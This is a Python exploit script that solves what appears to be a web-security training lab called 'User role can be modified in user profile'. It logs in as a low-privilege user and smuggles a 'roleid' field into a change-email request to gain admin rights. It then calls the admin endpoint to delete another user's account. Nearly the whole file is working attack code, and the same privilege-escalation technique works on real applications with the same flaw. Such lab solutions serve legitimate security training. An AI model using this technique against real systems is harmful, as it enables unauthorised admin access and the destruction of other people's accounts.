# User role can be modified in user profile

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



##########################################################
#	FUNCTIONS
##########################################################

def delete_carlos(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('[+] Trying to connect to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		change_email_path = url + '/my-account/change-email'
		data_role = {'email': 'gwyo@attacker.com', 'roleid': 2}
		print('[+] Trying to change the role ID to find Admin panel...')
		r = s.post(change_email_path, json=data_role)
		time.sleep(1)
		if 'Admin panel' in r.text:
			print("[+] Admin panel found !")
			delete_user_path = url + "/admin/delete?username=carlos"
			print('[+] Trying to delete Carlos user...')
			r = s.get(delete_user_path, allow_redirects=True)
			time.sleep(1)
			res = r.text
			if 'User deleted successfully!' in res:
				print('[+] Carlos user successfully deleted !')
			else:
				print('[-] Exploit failed to delete Carlos user <!>')
		else:
			print('[-] Exploit failed to get Admin role <!>')
	else:
		print('[-] Exploit failed to connect as Wiener <!>')

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)


##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: User role can be modified in user profile')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Unprotected feature to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			r = delete_carlos(s, url)

			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()

